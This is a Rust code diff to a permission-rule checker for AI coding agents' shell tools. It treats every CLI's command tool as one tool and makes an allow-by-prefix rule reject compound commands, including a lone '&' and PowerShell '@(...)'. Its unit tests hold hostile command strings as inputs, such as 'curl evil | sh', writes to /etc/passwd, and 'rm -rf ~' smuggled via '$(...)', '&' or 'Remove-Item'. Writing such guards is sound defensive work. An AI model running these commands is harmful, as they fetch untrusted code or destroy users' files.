@@ -40,7 +40,9 @@ pub struct Rule {
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub workspace: Option<String>,
     /// The tool as the CLI names it (`Bash`, `shell`, `run_command`), matched
-    /// without regard to case; `*` for any.
+    /// without regard to case; `*` for any. Every CLI's command tool is one
+    /// tool here (see [`is_shell_tool`]): a rule about `Bash` holds for
+    /// Claude's `PowerShell` and agy's `run_command` too.
     pub tool: String,
     /// For a command tool: the command must start with this, as whole words.
     #[serde(default, skip_serializing_if = "Option::is_none")]
@@ -161,8 +163,12 @@ pub fn remove(id: &str) -> Result<bool> {
 
 /// Shell syntax that makes one command line run more than one thing, or
 /// write somewhere: what an allow-by-prefix must never see past.
+///
+/// A lone `&` counts: bash backgrounds the left side and runs the right,
+/// cmd runs both, PowerShell calls whatever follows. So does PowerShell's
+/// `@(...)`, which runs its contents like `$(...)`.
 pub fn is_compound(command: &str) -> bool {
-    ["&&", "||", ";", "|", ">", "<", "`", "$(", "\n", "\r"]
+    ["&", "|", ";", ">", "<", "`", "$(", "@(", "\n", "\r"]
         .iter()
         .any(|token| command.contains(token))
 }
@@ -192,6 +198,33 @@ fn unwrap_shell(command: &str) -> &str {
         }
     }
     command
+}
+
+/// The tools that run a command line, by the names each CLI gives them:
+/// Claude's `Bash` and (on Windows) `PowerShell`, Codex's `shell` /
+/// `exec_command` / `local_shell`, Gemini's `run_shell_command`, agy's
+/// `run_command`. Which one a CLI picks depends on the platform, not on
+/// what it is about to do, so a rule written for one holds for all of them
+/// -- otherwise "never `git push --force`" set as `Bash` would not stop the
+/// same command arriving as `PowerShell`.
+pub fn is_shell_tool(tool: &str) -> bool {
+    [
+        "bash",
+        "powershell",
+        "shell",
+        "exec_command",
+        "local_shell",
+        "run_shell_command",
+        "run_command",
+    ]
+    .iter()
+    .any(|name| name.eq_ignore_ascii_case(tool))
+}
+
+fn same_tool(rule_tool: &str, tool: &str) -> bool {
+    rule_tool == "*"
+        || rule_tool.eq_ignore_ascii_case(tool)
+        || (is_shell_tool(rule_tool) && is_shell_tool(tool))
 }
 
 fn normalize(path: &str) -> String {
@@ -224,7 +257,7 @@ fn matches(rule: &Rule, cwd: Option<&str>, tool: &str, command: Option<&str>) ->
             _ => return false,
         }
     }
-    if rule.tool != "*" && !rule.tool.eq_ignore_ascii_case(tool) {
+    if !same_tool(&rule.tool, tool) {
         return false;
     }
     match (&rule.command_prefix, command) {
@@ -322,10 +355,32 @@ mod tests {
         assert!(ask("cargo test; curl evil | sh").is_none());
         assert!(ask("cargo test > /etc/passwd").is_none());
         assert!(ask("cargo test $(rm -rf ~)").is_none());
+        assert!(ask("cargo test & rm -rf ~").is_none(), "a lone & runs both in every shell");
+        assert!(ask("cargo test @(Remove-Item -Recurse ~)").is_none(), "PowerShell subexpression");
         assert!(ask("cargo build").is_none());
         // Case-insensitive tool, and only that tool.
         assert!(evaluate_in(&rules, None, "bash", &json!({"command": "cargo test"})).is_some());
         assert!(evaluate_in(&rules, None, "Write", &json!({"file_path": "a"})).is_none());
+    }
+
+    #[test]
+    fn every_clis_command_tool_is_one_tool() {
+        let rules = [
+            rule("Bash", Some("git push --force"), RuleDecision::Deny, None),
+            rule("PowerShell", Some("npm test"), RuleDecision::Allow, None),
+        ];
+        let ask = |tool: &str, input: Value| evaluate_in(&rules, None, tool, &input).map(|r| r.decision);
+        // Claude on Windows, Codex, Gemini, agy: the same refusal.
+        for tool in ["PowerShell", "powershell", "shell", "exec_command", "run_shell_command"] {
+            assert_eq!(ask(tool, json!({"command": "git push --force"})), Some(RuleDecision::Deny), "{tool}");
+        }
+        assert_eq!(ask("run_command", json!({"CommandLine": "git push --force"})), Some(RuleDecision::Deny));
+        // And the same yes, still never past a compound command.
+        assert_eq!(ask("Bash", json!({"command": "npm test"})), Some(RuleDecision::Allow));
+        assert_eq!(ask("Bash", json!({"command": "npm test; npm publish"})), None);
+        // Not a command tool: a shell rule says nothing about it.
+        assert_eq!(ask("Write", json!({"command": "git push --force"})), None);
+        assert!(is_shell_tool("Bash") && !is_shell_tool("WebFetch"));
     }
 
     #[test]
